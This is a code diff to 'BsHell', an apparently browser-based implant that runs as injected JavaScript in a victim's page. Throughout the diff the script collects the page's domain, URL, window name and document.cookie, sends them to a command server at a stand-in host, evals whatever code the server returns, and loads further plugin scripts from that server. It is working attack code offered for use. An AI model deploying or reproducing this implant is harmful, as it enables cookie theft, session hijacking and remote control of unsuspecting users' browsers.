@@ -29,6 +29,9 @@ if(typeof JSON == "undefined") {
     };
 }
 
+if(typeof options == "undefined")
+    var options = {url:'http://exampledomain.com/bshell.php', requestMethod:'post'/*, requestHeader: 'Accept-Language'*/};
+
 (function(options) {
     var self = this;
     
@@ -37,9 +40,11 @@ if(typeof JSON == "undefined") {
 	self.url = options.url;
     self.options = options;
     self.plugins = {};
+    self.initialized_plugins = {};
     self.timer = false;
     self.stopped = false;
     self.sessionId = false;
+    self.backoff = 0
 
     this.parseResponse = function(txt) {
 	var msg;
@@ -82,25 +87,43 @@ if(typeof JSON == "undefined") {
 	if(typeof data == "object")
 	    for(var k in data)
 		packet[k] = data[k];
-	
-	self.http_req(self.options.requestMethod,
-		      url,
-		      packet, 
-		      callback,
-		      self.options.requestHeader);
+	self.make_request(url, packet, callback);
+    };
+
+    // Patch here to hook a request handler, such as the css_channel plugin.
+    this.make_request = function(url, packet, callback) {
+	switch(this.options.requestMethod) {
+	case "get":
+	case "post":
+	    self.http_req(self.options.requestMethod,
+			  url,
+			  packet, 
+			  callback,
+			  self.options.requestHeader);
+	    break;
+	default:
+	    if(self.plugins[this.options.requestMethod])
+		self.plugins[this.options.requestMethod].make_request(url,packet,callback);
+	    break;
+	}
+    };
+
+    this.encode_packet = function(packet) {
+	return escape(JSON.stringify(packet))
     };
 
     this.http_req = function(method, url,packet,callback,header_name)
     {
+	var req = self.encode_packet(packet);
 	if(method.toLowerCase() == "get" && typeof header_name == "undefined")
-	    url = url + "?req=" + encodeURIComponent(JSON.stringify(packet));
+	    url = url + "?req=" + req;
 	var xhr = self.begin_xhr(method, url, callback);
 	if(typeof header_name != "undefined")
-	    xhr.setRequestHeader(header_name, escape(JSON.stringify(packet)));
+	    xhr.setRequestHeader(header_name, req);
 	if(method.toLowerCase() == "post") {
 	    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 	    if(typeof header_name == "undefined") {
-		xhr.send("req=" + escape(JSON.stringify(packet)));
+		xhr.send("req=" + req);
 		return;
 	    }
 	}
@@ -130,8 +153,12 @@ if(typeof JSON == "undefined") {
     };
     
     this.readCookie = function(name) {
-	var m = document.cookie.match(/BsHell=([0-9A-Za-z]{32})/);
-	return (m && m.length == 2) ? m[1] : false;
+	try {
+	    var m = document.cookie.match(/BsHell=([0-9A-Za-z]{32})/);
+	    return (m && m.length == 2) ? m[1] : false;
+	} catch(e) {
+	    return false;
+	}
     }
     
     this.stop = function() {
@@ -145,15 +172,29 @@ if(typeof JSON == "undefined") {
     
     this.start = function() {
 	self.log("starting BsHell");
+	if(typeof chrome != "undefined")
+	    console.dir(chrome);
 	self.detectSelf();
+	if(self.options.plugins) {
+	    setTimeout(self.loadPlugins, 100);
+	} else {
+	    self.send_initial_request();
+	}
+    }
+
+    this.send_initial_request = function() {
 	var packet = {
 	    domain: document.domain,
 	    page: document.location.href
 	}
-	if(window.name)
+	if(window.name) {
 	    packet.window_name = window.name;
-	if(document.cookie)
-	    packet.cookies = document.cookie;
+	}
+	try {
+	    if(document.cookie) {
+		packet.cookies = document.cookie;
+	    }
+	} catch(e) {}
 	packet.cmd = this.resumeSession() ? "resume" : "start";
 	self.trigger(packet);
     };
@@ -161,13 +202,43 @@ if(typeof JSON == "undefined") {
     this.trigger = function(data) {
 	if(self.timer != false)
 	    clearTimeout(self.timer);
+
 	self.timer = setTimeout(function() {
 	    self.send(data);
-	}, (data != false && data.cmd) ? 1 : 5000);
+	}, self.backoff*1000);
+    };
+
+    this.getApi = function(code, cmdId) {
+	return {
+	    root_url: self.script_location.substr(0, self.script_location.lastIndexOf("/")+1),
+	    plugins: self.plugins,
+	    send: function(data) {
+		setTimeout(function() {self.send({cmd: "result", id: cmdId, response: data});},10);
+	    },
+	    stop: function() {
+		self.stop();
+	    },
+	    register_plugin: function(name, plugin) {
+		self.registerPlugin(name, new plugin(self));
+		this.plugins = self.plugins;
+	    },
+	    require_plugin: function(name) {
+		return self.requirePlugin(name, code);
+	    },
+	    run_payload: function(name) {
+		setTimeout(function() {self.send({cmd: "payload", name: name, requester: cmdId});},10);
+	    }
+	}
     };
 
     this.registerPlugin = function(name, plugin) {
-	self.plugins[name] = plugin;
+	try {
+	    plugin.init();
+	    self.plugins[name] = plugin;
+	    self.initialized_plugins[name] = 3;
+	} catch(e) {
+	    self.log("failed to register plugin " + name + ": " + e.message);
+	}
     };
 
     this.requirePlugin = function(name, orig) {
@@ -186,17 +257,75 @@ if(typeof JSON == "undefined") {
 				 self.receive(orig);// run original code again
 			 });
 		     });
+	    self.log("sent request for plugin " + name);
 	}, 10);
 	return false;
     };
 
+    self.loadPlugins = function(callback) {
+	if(document.body == null) {
+	    setTimeout(self.loadPlugins, 200);
+	    return;
+	}
+	window.bshell = self.getApi("");
+	var missing = 0;
+	for(var plug in self.options.plugins) {
+	    var name = self.options.plugins[plug];
+	    if(typeof self.initialized_plugins[name] == "undefined") {
+		self.log("loading plugin: " + name);
+
+		var url = self.script_location.substr(0, self.script_location.lastIndexOf("/")+1);
+		url += '/plugins/' + name + '/' + name + ".js";
+		var scr = document.createElement('script');
+		scr.setAttribute('type', 'text/javascript');
+		scr.setAttribute('src', url);
+		scr.onload = function() {document.body.removeChild(this);};
+		document.body.appendChild(scr);
+
+		self.initialized_plugins[name] = 1;
+	    }
+	    else if(self.initialized_plugins[name] == 1) {
+		// wait for plugin to load
+		if(typeof self.plugins[name] != "undefined")
+		    self.initialized_plugins[name] = 2;
+	    }
+	    else if(self.initialized_plugins[name] == 2) {
+		try {
+		    self.initialized_plugins[name] = 3;
+		    self.plugins[name].init();
+		    self.log("bootstrapped plugin: " + name);
+		} catch(e) {
+		    self.log("failed to init plugin " + name + ":" + e.message);
+		}
+	    }
+
+	    if(self.initialized_plugins[name] != 3)
+		missing++;
+	}
+
+	if(missing == 0) {
+	    self.log("loadPlugins: all plugins bootstrapped, send initial request");
+	    setTimeout(self.send_initial_request, 50);
+	}
+	else {
+	    setTimeout(self.loadPlugins, 50);
+	}
+    };
+
     this.receive = function(text, callback) {
-	var msg = self.parseResponse(text);
 	var trigger = self.trigger;
 	if(self.stopped) {
 	    trigger = function() {};
 	}
 
+	if(text == "[]" || text == "") {
+	    if(typeof callback != "undefined")
+		callback({error:'no data'});
+	    trigger(false);
+	    return;
+	}
+
+	var msg = self.parseResponse(text);
 	if(msg.error) {
 	    self.log("failed to parse message: " + text + ": " + msg.error);
 	    if(typeof callback != "undefined")
@@ -204,62 +333,43 @@ if(typeof JSON == "undefined") {
 	    trigger(false);
 	    return;
 	}
-	self.log("received msg", msg)
 
 	if(msg.sessionId && (!self.sessionId || self.sessionId != msg.sessionId))
 	    self.sessionId = msg.sessionId;
 	if(msg.code) {
 	    var cod = msg.code;
-	    var cmdId = msg.id;
+	    self.log("executing code for " + msg.id);
 	    setTimeout(function() { 
 		var ret={}, res = false;
 		try {
-		    var bshell = {
-			root_url: self.script_location.substr(0, self.script_location.lastIndexOf("/")+1),
-			plugins: self.plugins,
-			send: function(data) {
-			    setTimeout(function() {self.send({cmd: "result", id: cmdId, response: data});},10);
-			},
-			stop: function() {
-			    self.stop();
-			},
-			register_plugin: function(name, plugin) {
-			    self.registerPlugin(name, new plugin(self));
-			    this.plugins = self.plugins;
-			},
-			require_plugin: function(name) {
-			    return self.requirePlugin(name, text);
-			},
-			run_payload: function(name) {
-			    setTimeout(function() {self.send({cmd: "payload", name: name, requester: cmdId});},10);
-			}
-		    };
+		    var bshell = self.getApi(text, msg.id);
 		    eval("res = " + cod);
 		    ret.response = res;
 		} catch(e) {
-		    debugger;
 		    ret={error: e.message};
 		}
-		self.log("result from code: ", ret);
+		self.log("result from " + msg.id + ": ", ret);
 		
 		if(ret.response != false && typeof ret.response != "undefined") {
-		    ret.id = cmdId;
+		    ret.id = msg.id;
 		    ret.cmd = "result";
 		    self.trigger(ret); // intentional self.trigger!
 		} else {
 		    trigger(false);
 		}
-		if(typeof callback != "undefined")
+	    	if(typeof callback == "function")
 		    callback(ret);
 	    }, 1);
 	}
 	else
 	    trigger(false);
     };
-    
+
     this.send = function(data) {
+	self.backoff = (data != false) ? 1 : (self.backoff < 10 ? self.backoff+self.backoff/2 : 10);
 	self.req(self.url, data, self.receive);
-	self.log("sent data", data);
+	if(data != false)
+	    self.log("sent data", data);
     };
     
     this.log = function(str, obj) {
@@ -270,4 +380,4 @@ if(typeof JSON == "undefined") {
 	console.log("LOG: " + str);
     };
     this.start();
-}({url:'bshell.php', requestMethod:'post'/*, requestHeader: 'Accept-Language'*/}));
+}(options));
